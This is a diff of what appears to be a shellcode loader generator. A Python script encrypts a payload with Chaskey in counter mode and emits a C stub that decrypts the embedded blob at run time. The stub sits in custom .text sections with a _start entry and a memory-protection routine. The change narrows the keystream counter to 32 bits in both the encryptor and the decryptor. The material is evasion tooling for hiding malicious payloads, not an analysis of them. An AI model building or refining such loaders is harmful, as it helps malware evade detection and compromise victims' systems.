@@ -37,9 +37,9 @@ def chaskey_ctr_keystream(key, nonce, length):
     stream = bytearray()
     ctr = 0
     while len(stream) < length:
-        block = nonce + struct.pack("<Q", ctr)
+        block = nonce + struct.pack("<I", ctr) + b"\x00\x00\x00\x00"
         stream.extend(chaskey_prf(key, block))
-        ctr += 1
+        ctr = (ctr + 1) & 0xFFFFFFFF
     return bytes(stream[:length])
 
 # --- CLI and I/O ---
@@ -95,7 +95,6 @@ if use_encrypt:
         PULONG OldProtect
     );
     
-    typedef unsigned long long u64;
     typedef unsigned long u32;
 
     __attribute__((section(".text")))
@@ -134,19 +133,24 @@ if use_encrypt:
         for(i=0;i<4;i++) ((u32*)out)[i] = v[i];
     }}
 
-    void decrypt_blob(unsigned char *dst) {{
-        u64 ctr = 0;
-        unsigned char blk[16], ks[16];
-        unsigned int i,j;
-        for(i = 0; i < sizeof(enc_blob); i += 16) {{
-            for(j=0; j<8; j++) blk[j] = chaskey_nonce[j];
-            for(j=0; j<8; j++) blk[8+j] = ((unsigned char*)(&ctr))[j];
-            chaskey_prf(blk, ks);
-            for(j=0; j<16 && (i+j) < sizeof(enc_blob); j++)
-                dst[i+j] = enc_blob[i+j] ^ ks[j];
-            ctr++;
-        }}
-    }}
+      void decrypt_blob(unsigned char *dst) {{
+          u32 ctr = 0;
+          unsigned char blk[16], ks[16];
+          unsigned int i, j;
+      
+          for (i = 0; i < sizeof(enc_blob); i += 16) {{
+              for (j = 0; j < 8; j++) blk[j] = chaskey_nonce[j];
+              *(u32 *)(blk + 8)  = ctr;
+              *(u32 *)(blk + 12) = 0;
+      
+              chaskey_prf(blk, ks);
+      
+              for (j = 0; j < 16 && (i + j) < sizeof(enc_blob); j++)
+                  dst[i + j] = enc_blob[i + j] ^ ks[j];
+      
+              ctr++;
+          }}
+      }}
 
     __attribute__((section(".text.start")))
     void _start(void) {{
